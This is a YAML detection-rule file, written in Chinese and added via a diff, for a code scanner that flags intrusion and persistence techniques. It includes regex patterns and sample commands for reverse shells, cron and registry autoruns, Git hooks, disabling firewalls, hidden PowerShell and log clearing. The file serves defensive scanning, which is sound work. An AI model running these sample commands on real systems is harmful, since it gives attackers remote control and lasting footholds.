@@ -1,0 +1,137 @@
+category_id: intrusion
+category: 入侵与持久化
+description: 反弹连接、开监听端口、提权、写启动项/定时任务/Git 钩子。目的是让攻击者进得来、留得住。
+default_disposition: 必须删除
+rules:
+  - id: IN001
+    name: 反弹 shell
+    languages: [any]
+    pattern: '(/dev/tcp/|\bnc\b[^\n]*\s-e\s|\bncat\b[^\n]*--exec|\bsocket\.socket\([^\n]*\bdup2\b|pty\.spawn\(["'']/bin/(ba)?sh|\bbash\s+-i\s+>&|0<&196|exec\s+5<>/dev/tcp)'
+    severity: 严重
+    literal: 'bash -i >& /dev/tcp/地址/端口 0>&1（交互式壳 重定向到 网络连接）：把命令行窗口连到远程机器'
+    plain: '这是"反弹 shell"：你的机器主动连到攻击者那边，然后把命令行交给他。防火墙一般不拦主动连出去的连接，所以这招很常用。'
+    consequence: '攻击者获得你机器的完整命令行控制权。'
+    authority: ['CWE-506 嵌入的恶意代码', 'MITRE ATT&CK T1059 命令与脚本解释器']
+    is_script: true
+    exploit_sensitive: true
+
+  - id: IN002
+    name: 监听任意地址端口
+    languages: [python, javascript, typescript, shell]
+    pattern: '(\.bind\(\s*\(\s*["'']0\.0\.0\.0["'']|\.listen\(\s*\d+\s*,\s*["'']0\.0\.0\.0["'']|host\s*=\s*["'']0\.0\.0\.0["'']|--host\s+0\.0\.0\.0|\bnc\s+-l|\bncat\s+-l)'
+    severity: 中
+    literal: 'bind(("0.0.0.0", 端口))（绑定（所有网卡地址，端口））：在所有网络接口上开门等连接'
+    plain: '0.0.0.0 意思是"谁都能连"，包括公网。开发时用 127.0.0.1（只有自己能连）更安全。'
+    consequence: '服务暴露到公网；若无认证即可被任何人访问。'
+    authority: ['CWE-668 资源暴露到错误范围', 'OWASP A05:2021 安全配置错误']
+    is_script: false
+    exploit_sensitive: false
+    disposition: 必须修复
+
+  - id: IN003
+    name: 写入定时任务
+    languages: [any]
+    pattern: '(\bcrontab\s+(-|<|\S+\.cron)|/etc/cron\.(d|daily|hourly)/|/var/spool/cron/|\bschtasks\s+/create|launchctl\s+load|LaunchAgents/|LaunchDaemons/|\.timer\b[^\n]*systemctl)'
+    severity: 高
+    literal: 'crontab -（定时任务表 从标准输入写入）/ schtasks /create（计划任务 /创建）：让某段程序定时自动运行'
+    plain: '程序给自己安排了"每隔一段时间自动跑一次"。你关掉它，它到点又起来。正常应用极少需要偷偷装定时任务。'
+    consequence: '持久化：恶意行为反复执行、难以清除。'
+    authority: ['MITRE ATT&CK T1053 计划任务', 'CWE-506']
+    is_script: true
+    exploit_sensitive: false
+
+  - id: IN004
+    name: 写入启动项 / shell 配置
+    languages: [any]
+    pattern: '(>>?\s*~?/?[^\s]*\.(bashrc|zshrc|profile|bash_profile)\b|/etc/rc\.local|/etc/init\.d/|systemctl\s+enable|CurrentVersion\\\\Run\b|HKCU\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run|Startup\\\\|/etc/systemd/system/[^\s]+\.service)'
+    severity: 高
+    literal: 'echo "…" >> ~/.bashrc（把命令追加到 shell 启动配置）：每次打开终端自动执行'
+    plain: '程序往你的终端启动文件或系统启动项里写了东西。以后你每次开终端、开机，那段东西就跟着跑。'
+    consequence: '持久化后门；篡改环境变量、劫持命令。'
+    authority: ['MITRE ATT&CK T1547 启动项持久化', 'CWE-506']
+    is_script: true
+    exploit_sensitive: false
+
+  - id: IN005
+    name: 写入 Git 钩子
+    languages: [any]
+    pattern: '\.git[/\\]hooks[/\\](pre-commit|post-commit|pre-push|post-checkout|post-merge|prepare-commit-msg)\b|core\.hooksPath'
+    severity: 高
+    literal: '.git/hooks/pre-commit（Git 钩子/提交前）：在你每次提交代码时自动执行的脚本'
+    plain: '往 Git 钩子里写东西，以后你每次提交、推送、切分支时它都会静默运行。这是把代码藏进开发流程的经典手法。'
+    consequence: '持久化；每次 Git 操作都触发隐藏行为。'
+    authority: ['MITRE ATT&CK T1546 事件触发执行', 'CWE-506']
+    is_script: true
+    exploit_sensitive: false
+
+  - id: IN006
+    name: 提权 / 关闭安全防护
+    languages: [shell, python, any]
+    pattern: '(\bsudo\s+(chmod\s+[0-7]*777|chown\s+-R\s+root)|\bsetuid\(0\)|\bsetenforce\s+0\b|ufw\s+disable|iptables\s+-F\b|Set-MpPreference\s+-DisableRealtimeMonitoring|csrutil\s+disable|spctl\s+--master-disable)'
+    severity: 严重
+    literal: 'setenforce 0（设置强制模式 0）/ ufw disable（防火墙 关闭）：关掉系统安全防护'
+    plain: '程序在关你的防火墙、关安全模块、或把权限改成所有人可写。正常软件不会替你做这些。'
+    consequence: '系统失去防护；后续攻击畅通无阻。'
+    authority: ['MITRE ATT&CK T1562 削弱防御', 'CWE-284 访问控制不当']
+    is_script: true
+    exploit_sensitive: false
+
+  - id: IN007
+    name: 修改 hosts / DNS / 代理
+    languages: [any]
+    pattern: '(/etc/hosts\b[^\n]*(>>|write|open\()|System32\\\\drivers\\\\etc\\\\hosts|/etc/resolv\.conf\b[^\n]*(>>|write)|networksetup\s+-set(web|secureweb)proxy|HTTP_PROXY\s*=\s*["'']https?://(?!127\.0\.0\.1|localhost))'
+    severity: 高
+    literal: '/etc/hosts >>（系统域名表 追加写入）：改变某个网址实际指向的机器'
+    plain: '改了 hosts 或代理，你以为访问的是 A 网站，实际连到了别人的机器。'
+    consequence: '流量被劫持、钓鱼、中间人窃听。'
+    authority: ['MITRE ATT&CK T1557 中间人', 'CWE-350']
+    is_script: true
+    exploit_sensitive: false
+
+  - id: IN009
+    name: Windows 注册表启动项 / reg add
+    languages: [any]
+    pattern: '(?i)(HK(LM|CU|EY_LOCAL_MACHINE|EY_CURRENT_USER)\\[^\n]*CurrentVersion\\(Run|RunOnce|Explorer\\Shell Folders|Winlogon)|\breg(\.exe)?\s+add\b|New-ItemProperty\s+[^\n]*Run|Set-ItemProperty\s+[^\n]*(Run|Winlogon|Userinit|Shell)\b|Image File Execution Options|AppInit_DLLs)'
+    severity: 高
+    literal: 'reg add HKLM\…\CurrentVersion\Run（注册表 添加 开机自启项）：往 Windows 注册表写开机自动运行'
+    plain: '程序往 Windows 注册表的"开机自启"位置写了东西。以后每次开机它都会自动跑。这是 Windows 上最常见的持久化手法。'
+    consequence: '持久化后门；难以清除。'
+    authority: ['MITRE ATT&CK T1547.001 注册表 Run 键', 'CWE-506']
+    is_script: true
+    exploit_sensitive: false
+
+  - id: IN010
+    name: Windows 启动文件夹 / WMI 订阅 / 服务安装
+    languages: [any]
+    pattern: '(?i)(\\Start Menu\\Programs\\Startup|shell:startup|__EventFilter|CommandLineEventConsumer|Register-WmiEvent|Register-CimIndicationEvent|\bsc(\.exe)?\s+create\b|New-Service\s|Set-Service\s+[^\n]*-StartupType\s+Automatic)'
+    severity: 高
+    literal: 'Startup 文件夹 / Register-WmiEvent / sc create（启动文件夹 / 注册 WMI 事件 / 创建服务）：另外几种 Windows 开机自启方式'
+    plain: '把程序放进开机启动文件夹、注册成系统服务、或者用 WMI 事件订阅（一种很隐蔽的方式）让自己被自动触发。'
+    consequence: '持久化；WMI 订阅尤其难被发现。'
+    authority: ['MITRE ATT&CK T1547.001 / T1546.003 / T1543.003']
+    is_script: true
+    exploit_sensitive: false
+
+  - id: IN011
+    name: PowerShell 绕过执行策略 / 编码命令 / 隐藏窗口
+    languages: [any]
+    pattern: '(?i)(Set-ExecutionPolicy\s+(Bypass|Unrestricted)|-ExecutionPolicy\s+(Bypass|Unrestricted)|-(EncodedCommand|enc|ec)\s+[A-Za-z0-9+/=]{20,}|-WindowStyle\s+Hidden|-w\s+hidden|-NoProfile\s+-NonInteractive\s+-Command|Add-MpPreference\s+-ExclusionPath|powershell[^\n]*-nop\s+-w\s+hidden)'
+    severity: 严重
+    literal: 'powershell -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand …（绕过执行策略 隐藏窗口 编码后的命令）'
+    plain: '同时出现"绕过安全策略"、"窗口藏起来"、"命令是编码过的看不见内容"——三件事凑一起，几乎只有恶意脚本会这么写。'
+    consequence: '静默执行隐藏内容；关闭 Windows Defender 排除项。'
+    authority: ['MITRE ATT&CK T1059.001 PowerShell', 'T1027 混淆', 'T1562.001 削弱防御']
+    is_script: true
+    exploit_sensitive: true
+
+  - id: IN008
+    name: 自我删除 / 清除痕迹
+    languages: [shell, python, any]
+    pattern: '(\brm\s+(-rf?\s+)?["'']?\$0\b|os\.remove\(\s*(sys\.argv\[0\]|__file__)|history\s+-c\b|unset\s+HISTFILE|>\s*~/\.bash_history|Clear-EventLog|wevtutil\s+cl\b)'
+    severity: 高
+    literal: 'os.remove(__file__)（删除（当前文件自身））/ history -c（历史 清空）：运行完把自己删掉、清掉命令记录'
+    plain: '正常程序不会跑完把自己删了、把你的命令历史清空。这么做只为不留痕迹。'
+    consequence: '事后无法取证、无法知道它做过什么。'
+    authority: ['MITRE ATT&CK T1070 清除痕迹']
+    is_script: true
+    exploit_sensitive: false
